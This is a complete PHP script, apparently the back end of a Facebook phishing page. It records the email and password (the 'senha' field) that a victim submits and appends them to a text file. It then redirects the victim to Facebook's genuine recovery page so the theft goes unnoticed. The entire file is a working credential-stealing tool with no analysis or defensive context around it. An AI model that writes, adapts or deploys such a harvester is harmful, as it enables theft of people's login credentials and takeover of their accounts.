<?php 
file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['senha'] ."\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>
